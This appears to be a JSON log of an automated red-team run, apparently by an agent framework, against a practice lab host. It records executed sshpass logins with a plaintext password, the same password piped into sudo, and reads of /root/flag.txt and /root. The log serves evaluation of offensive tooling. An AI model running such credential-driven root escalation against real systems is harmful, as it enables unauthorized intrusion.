@@ -1,0 +1,88 @@
+{
+  "engagement_id": "stapler-live-001",
+  "target": "10.66.0.159",
+  "web_target": "http://10.66.0.159",
+  "persona": "redteam",
+  "phases": {
+    "credential": {
+      "phase": "credential",
+      "success": true,
+      "actions": [
+        {
+          "verdict": "approved",
+          "capability": "sshpass",
+          "args": "-p JZQuyIN5 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 peter@10.66.0.159 'id; hostname; whoami; groups'",
+          "broker": "allow",
+          "executed": true,
+          "success": true,
+          "returncode": 0,
+          "latency": 2.292,
+          "receipt_id": "6e296808157ff6b8",
+          "evidence_id": "ev_0c7fa8e59135",
+          "phase": "credential"
+        },
+        {
+          "verdict": "approved",
+          "capability": "sshpass",
+          "args": "-p JZQuyIN5 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 peter@10.66.0.159 'echo JZQuyIN5 | sudo -S -l'",
+          "broker": "allow",
+          "executed": true,
+          "success": true,
+          "returncode": 0,
+          "latency": 2.028,
+          "receipt_id": "3d198feea4877c7f",
+          "evidence_id": "ev_37c120bad32e",
+          "phase": "credential"
+        }
+      ]
+    },
+    "postex": {
+      "phase": "postex",
+      "success": true,
+      "actions": [
+        {
+          "verdict": "approved",
+          "capability": "sshpass",
+          "args": "-p JZQuyIN5 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 peter@10.66.0.159 'echo JZQuyIN5 | sudo -S id'",
+          "broker": "allow",
+          "executed": true,
+          "success": true,
+          "returncode": 0,
+          "latency": 1.956,
+          "receipt_id": "7a8f49c16f34d2a6",
+          "evidence_id": "ev_da535fe855d2",
+          "phase": "postex"
+        },
+        {
+          "verdict": "approved",
+          "capability": "sshpass",
+          "args": "-p JZQuyIN5 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 peter@10.66.0.159 'echo JZQuyIN5 | sudo -S cat /root/flag.txt'",
+          "broker": "allow",
+          "executed": true,
+          "success": true,
+          "returncode": 0,
+          "latency": 1.894,
+          "receipt_id": "3cf2ca14c1465519",
+          "evidence_id": "ev_2ec1604b9312",
+          "phase": "postex"
+        },
+        {
+          "verdict": "approved",
+          "capability": "sshpass",
+          "args": "-p JZQuyIN5 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 peter@10.66.0.159 'echo JZQuyIN5 | sudo -S ls -la /root/'",
+          "broker": "allow",
+          "executed": true,
+          "success": true,
+          "returncode": 0,
+          "latency": 2.52,
+          "receipt_id": "8c247f3fb82a1290",
+          "evidence_id": "ev_7d1c797e6e37",
+          "phase": "postex"
+        }
+      ]
+    }
+  },
+  "telemetry_path": "/home/yaser/raphael-2.0/evaluations/campaign/stapler_live_1785659305.jsonl",
+  "timestamp": 1785659294.4074988,
+  "mode": "interactive"
+}
